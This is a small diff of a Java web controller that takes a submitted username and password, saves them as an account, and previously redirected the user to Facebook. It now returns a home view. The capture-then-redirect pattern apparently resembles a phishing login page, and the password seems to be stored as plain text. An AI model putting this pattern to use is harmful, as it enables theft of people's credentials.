@@ -39,8 +39,8 @@ public class HomeController {
 		String name = request.getParameter("name");
 		String pass = request.getParameter("pass");
 		Account acc = new Account(name, pass);
-		m.addAttribute("yeah", "yeah");
+		m.addAttribute("yes", "yes");
 		ad.uploadAcc(acc);
-		return "https://www.facebook.com/";
+		return "home";
 	}
 }
